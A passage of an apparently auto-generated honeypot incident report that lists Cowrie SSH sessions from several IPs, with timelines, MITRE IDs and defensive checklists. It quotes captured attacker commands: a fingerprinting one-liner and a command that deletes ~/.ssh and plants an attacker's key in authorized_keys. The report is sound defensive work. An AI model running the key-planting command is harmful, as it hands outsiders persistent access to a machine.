| `2026-09-03 15:28:26` | `cowrie.command.input` |
| `2026-09-03 15:28:26` | `cowrie.command.input` |
| `2026-09-03 15:28:26` | `cowrie.log.closed` |
| `2026-09-03 15:28:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca69212950b4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:30 |
| **Last Seen** | 2026-09-03 15:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:30:36` | `cowrie.session.connect` |
| `2026-09-03 15:30:36` | `cowrie.client.version` |
| `2026-09-03 15:30:36` | `cowrie.client.kex` |
| `2026-09-03 15:30:37` | `cowrie.login.success` |
| `2026-09-03 15:30:39` | `cowrie.session.params` |
| `2026-09-03 15:30:39` | `cowrie.command.input` |
| `2026-09-03 15:30:39` | `cowrie.command.input` |
| `2026-09-03 15:30:39` | `cowrie.command.input` |
| `2026-09-03 15:30:39` | `cowrie.command.input` |
| `2026-09-03 15:30:39` | `cowrie.command.input` |
| `2026-09-03 15:30:39` | `cowrie.command.success` |
| `2026-09-03 15:30:39` | `cowrie.command.input` |
| `2026-09-03 15:30:39` | `cowrie.command.input` |
| `2026-09-03 15:30:39` | `cowrie.command.input` |
| `2026-09-03 15:30:39` | `cowrie.command.input` |
| `2026-09-03 15:30:40` | `cowrie.log.closed` |
| `2026-09-03 15:30:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-543445cf4106

| Field | Detail |
|---|---|
| **Source IP** | `157.20.37[.]254` |
| **First Seen** | 2026-09-03 15:30 |
| **Last Seen** | 2026-09-03 15:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:30:44` | `cowrie.session.connect` |
| `2026-09-03 15:30:44` | `cowrie.client.version` |
| `2026-09-03 15:30:44` | `cowrie.client.kex` |
| `2026-09-03 15:30:45` | `cowrie.login.success` |
| `2026-09-03 15:30:46` | `cowrie.session.params` |
| `2026-09-03 15:30:46` | `cowrie.command.input` |
| `2026-09-03 15:30:46` | `cowrie.command.failed` |
| `2026-09-03 15:30:48` | `cowrie.log.closed` |
| `2026-09-03 15:30:49` | `cowrie.session.params` |
| `2026-09-03 15:30:49` | `cowrie.command.input` |
| `2026-09-03 15:30:49` | `cowrie.session.file_download` |
| `2026-09-03 15:30:49` | `cowrie.log.closed` |
| `2026-09-03 15:30:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.20.37[.]254` to AbuseIPDB if not already reported
- [ ] Block `157.20.37[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-312810e4daf9

| Field | Detail |
|---|---|
| **Source IP** | `157.20.37[.]254` |
| **First Seen** | 2026-09-03 15:30 |
| **Last Seen** | 2026-09-03 15:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:30:49` | `cowrie.session.connect` |
| `2026-09-03 15:30:49` | `cowrie.client.version` |
| `2026-09-03 15:30:49` | `cowrie.client.kex` |
| `2026-09-03 15:30:50` | `cowrie.login.success` |
| `2026-09-03 15:30:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.20.37[.]254` to AbuseIPDB if not already reported
- [ ] Block `157.20.37[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96c5ea77ed6c

| Field | Detail |
|---|---|
| **Source IP** | `157.20.37[.]254` |
| **First Seen** | 2026-09-03 15:30 |
| **Last Seen** | 2026-09-03 15:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:30:51` | `cowrie.session.connect` |
| `2026-09-03 15:30:51` | `cowrie.client.version` |
| `2026-09-03 15:30:51` | `cowrie.client.kex` |
| `2026-09-03 15:30:52` | `cowrie.login.success` |
| `2026-09-03 15:30:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.20.37[.]254` to AbuseIPDB if not already reported
- [ ] Block `157.20.37[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8e35dedc54c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 15:31 |
| **Last Seen** | 2026-09-03 15:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:31:20` | `cowrie.session.connect` |
| `2026-09-03 15:31:20` | `cowrie.client.version` |
| `2026-09-03 15:31:20` | `cowrie.client.kex` |
| `2026-09-03 15:31:21` | `cowrie.login.success` |
| `2026-09-03 15:31:21` | `cowrie.direct-tcpip.request` |
| `2026-09-03 15:31:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 15:31:21` | `cowrie.direct-tcpip.data` |
| `2026-09-03 15:31:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f1afb0765f7

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-03 15:32 |
| **Last Seen** | 2026-09-03 15:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:32:28` | `cowrie.session.connect` |
| `2026-09-03 15:32:28` | `cowrie.client.version` |
| `2026-09-03 15:32:28` | `cowrie.client.kex` |
| `2026-09-03 15:32:29` | `cowrie.login.success` |
| `2026-09-03 15:32:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83c1c4e39fd6

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-03 15:32 |
| **Last Seen** | 2026-09-03 15:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:32:30` | `cowrie.session.connect` |
| `2026-09-03 15:32:30` | `cowrie.client.version` |
| `2026-09-03 15:32:30` | `cowrie.client.kex` |
| `2026-09-03 15:32:31` | `cowrie.login.success` |
| `2026-09-03 15:32:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f082ec3194b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:32 |
| **Last Seen** | 2026-09-03 15:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:32:48` | `cowrie.session.connect` |
| `2026-09-03 15:32:48` | `cowrie.client.version` |
| `2026-09-03 15:32:48` | `cowrie.client.kex` |
| `2026-09-03 15:32:49` | `cowrie.login.success` |
| `2026-09-03 15:32:50` | `cowrie.session.params` |
| `2026-09-03 15:32:50` | `cowrie.command.input` |
| `2026-09-03 15:32:50` | `cowrie.command.input` |
| `2026-09-03 15:32:50` | `cowrie.command.input` |
| `2026-09-03 15:32:50` | `cowrie.command.input` |
| `2026-09-03 15:32:50` | `cowrie.command.input` |
| `2026-09-03 15:32:50` | `cowrie.command.success` |
| `2026-09-03 15:32:50` | `cowrie.command.input` |
| `2026-09-03 15:32:50` | `cowrie.command.input` |
| `2026-09-03 15:32:50` | `cowrie.command.input` |
| `2026-09-03 15:32:50` | `cowrie.command.input` |
| `2026-09-03 15:32:50` | `cowrie.log.closed` |
| `2026-09-03 15:32:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b395e53417b9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:35 |
| **Last Seen** | 2026-09-03 15:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:35:04` | `cowrie.session.connect` |
| `2026-09-03 15:35:04` | `cowrie.client.version` |
| `2026-09-03 15:35:04` | `cowrie.client.kex` |
| `2026-09-03 15:35:05` | `cowrie.login.success` |
| `2026-09-03 15:35:06` | `cowrie.session.params` |
| `2026-09-03 15:35:06` | `cowrie.command.input` |
| `2026-09-03 15:35:06` | `cowrie.command.input` |
| `2026-09-03 15:35:06` | `cowrie.command.input` |
| `2026-09-03 15:35:06` | `cowrie.command.input` |
| `2026-09-03 15:35:06` | `cowrie.command.input` |
| `2026-09-03 15:35:06` | `cowrie.command.success` |
| `2026-09-03 15:35:06` | `cowrie.command.input` |
| `2026-09-03 15:35:06` | `cowrie.command.input` |
| `2026-09-03 15:35:06` | `cowrie.command.input` |
| `2026-09-03 15:35:06` | `cowrie.command.input` |
| `2026-09-03 15:35:06` | `cowrie.log.closed` |
| `2026-09-03 15:35:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddc2239573f0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 15:35 |
| **Last Seen** | 2026-09-03 15:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:35:36` | `cowrie.session.connect` |
| `2026-09-03 15:35:37` | `cowrie.client.version` |
| `2026-09-03 15:35:37` | `cowrie.client.kex` |
| `2026-09-03 15:35:39` | `cowrie.login.success` |
| `2026-09-03 15:35:39` | `cowrie.direct-tcpip.request` |
| `2026-09-03 15:35:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 15:35:40` | `cowrie.direct-tcpip.data` |
| `2026-09-03 15:35:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d541fac95cf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:37 |
| **Last Seen** | 2026-09-03 15:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:37:24` | `cowrie.session.connect` |
| `2026-09-03 15:37:24` | `cowrie.client.version` |
| `2026-09-03 15:37:24` | `cowrie.client.kex` |
| `2026-09-03 15:37:24` | `cowrie.login.success` |
| `2026-09-03 15:37:25` | `cowrie.session.params` |
| `2026-09-03 15:37:25` | `cowrie.command.input` |
| `2026-09-03 15:37:25` | `cowrie.command.input` |
| `2026-09-03 15:37:25` | `cowrie.command.input` |
| `2026-09-03 15:37:25` | `cowrie.command.input` |
| `2026-09-03 15:37:25` | `cowrie.command.input` |
| `2026-09-03 15:37:25` | `cowrie.command.success` |
| `2026-09-03 15:37:25` | `cowrie.command.input` |
| `2026-09-03 15:37:25` | `cowrie.command.input` |
| `2026-09-03 15:37:25` | `cowrie.command.input` |
| `2026-09-03 15:37:25` | `cowrie.command.input` |
| `2026-09-03 15:37:25` | `cowrie.log.closed` |
| `2026-09-03 15:37:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50b3ae7b4122

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:42 |
| **Last Seen** | 2026-09-03 15:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:42:18` | `cowrie.session.connect` |
| `2026-09-03 15:42:19` | `cowrie.client.version` |
| `2026-09-03 15:42:19` | `cowrie.client.kex` |
| `2026-09-03 15:42:19` | `cowrie.login.success` |
| `2026-09-03 15:42:20` | `cowrie.session.params` |
| `2026-09-03 15:42:20` | `cowrie.command.input` |
| `2026-09-03 15:42:20` | `cowrie.command.input` |
| `2026-09-03 15:42:20` | `cowrie.command.input` |
| `2026-09-03 15:42:20` | `cowrie.command.input` |
| `2026-09-03 15:42:20` | `cowrie.command.input` |
| `2026-09-03 15:42:20` | `cowrie.command.success` |
| `2026-09-03 15:42:20` | `cowrie.command.input` |
| `2026-09-03 15:42:20` | `cowrie.command.input` |
| `2026-09-03 15:42:20` | `cowrie.command.input` |
| `2026-09-03 15:42:20` | `cowrie.command.input` |
| `2026-09-03 15:42:20` | `cowrie.log.closed` |
| `2026-09-03 15:42:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f080b7d54a9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 15:42 |
| **Last Seen** | 2026-09-03 15:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:42:29` | `cowrie.session.connect` |
| `2026-09-03 15:42:29` | `cowrie.client.version` |
| `2026-09-03 15:42:29` | `cowrie.client.kex` |
| `2026-09-03 15:42:30` | `cowrie.login.success` |
| `2026-09-03 15:42:30` | `cowrie.direct-tcpip.request` |
| `2026-09-03 15:42:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 15:42:30` | `cowrie.direct-tcpip.data` |
| `2026-09-03 15:42:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9ae1d5a0e54

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:44 |
| **Last Seen** | 2026-09-03 15:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:44:38` | `cowrie.session.connect` |
| `2026-09-03 15:44:38` | `cowrie.client.version` |
| `2026-09-03 15:44:39` | `cowrie.client.kex` |
| `2026-09-03 15:44:40` | `cowrie.login.success` |
| `2026-09-03 15:44:41` | `cowrie.session.params` |
| `2026-09-03 15:44:41` | `cowrie.command.input` |
| `2026-09-03 15:44:41` | `cowrie.command.input` |
| `2026-09-03 15:44:41` | `cowrie.command.input` |
| `2026-09-03 15:44:41` | `cowrie.command.input` |
| `2026-09-03 15:44:41` | `cowrie.command.input` |
| `2026-09-03 15:44:41` | `cowrie.command.success` |
| `2026-09-03 15:44:41` | `cowrie.command.input` |
| `2026-09-03 15:44:41` | `cowrie.command.input` |
| `2026-09-03 15:44:41` | `cowrie.command.input` |
| `2026-09-03 15:44:41` | `cowrie.command.input` |
| `2026-09-03 15:44:41` | `cowrie.log.closed` |
| `2026-09-03 15:44:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fe8af7ea72a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 15:45 |
| **Last Seen** | 2026-09-03 15:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:45:22` | `cowrie.session.connect` |
| `2026-09-03 15:45:22` | `cowrie.client.version` |
| `2026-09-03 15:45:22` | `cowrie.client.kex` |
| `2026-09-03 15:45:23` | `cowrie.login.success` |
| `2026-09-03 15:45:23` | `cowrie.direct-tcpip.request` |
| `2026-09-03 15:45:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 15:45:23` | `cowrie.direct-tcpip.data` |
| `2026-09-03 15:45:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32bbc23204f7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:46 |
| **Last Seen** | 2026-09-03 15:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:46:49` | `cowrie.session.connect` |
| `2026-09-03 15:46:49` | `cowrie.client.version` |
| `2026-09-03 15:46:50` | `cowrie.client.kex` |
| `2026-09-03 15:46:50` | `cowrie.login.success` |
| `2026-09-03 15:46:52` | `cowrie.session.params` |
| `2026-09-03 15:46:52` | `cowrie.command.input` |
| `2026-09-03 15:46:52` | `cowrie.command.input` |
| `2026-09-03 15:46:52` | `cowrie.command.input` |
| `2026-09-03 15:46:52` | `cowrie.command.input` |
| `2026-09-03 15:46:52` | `cowrie.command.input` |
| `2026-09-03 15:46:52` | `cowrie.command.success` |
| `2026-09-03 15:46:52` | `cowrie.command.input` |
| `2026-09-03 15:46:52` | `cowrie.command.input` |
| `2026-09-03 15:46:52` | `cowrie.command.input` |
| `2026-09-03 15:46:52` | `cowrie.command.input` |
| `2026-09-03 15:46:52` | `cowrie.log.closed` |
| `2026-09-03 15:46:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8b0ed8db9bb

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-09-03 15:47 |
| **Last Seen** | 2026-09-03 15:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:47:00` | `cowrie.session.connect` |
| `2026-09-03 15:47:00` | `cowrie.client.version` |
| `2026-09-03 15:47:00` | `cowrie.client.kex` |
| `2026-09-03 15:47:01` | `cowrie.login.success` |
